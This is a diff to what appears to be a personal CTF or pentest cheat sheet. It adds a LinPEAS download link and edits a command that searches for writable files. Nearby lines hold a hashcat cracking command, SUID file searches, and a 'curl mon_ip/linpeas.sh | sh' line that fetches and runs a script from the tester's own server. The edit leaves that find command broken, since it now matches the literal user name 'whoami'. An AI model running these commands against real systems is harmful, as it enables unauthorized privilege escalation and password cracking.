@@ -83,12 +83,14 @@ hashcat -m 0 hashPWD.txt rockyou.txt
 
 `sudo -l`
 
+Link Linpeas : https://github.com/carlospolop/PEASS-ng/releases/tag/20230529-e7da582f
+
 `python -m http.server 80 -> curl mon_ip/linpeas.sh | sh`
 
 `find / -perms -4000 -type f 2>/dev/null`
 `find / -type f -perm -04000 -ls 2>/dev/null`
 `find / -perm -4000 2>/dev/null`
-`find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null`
+`find / -writable ! -user whoami -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null`
 
 
 ```py
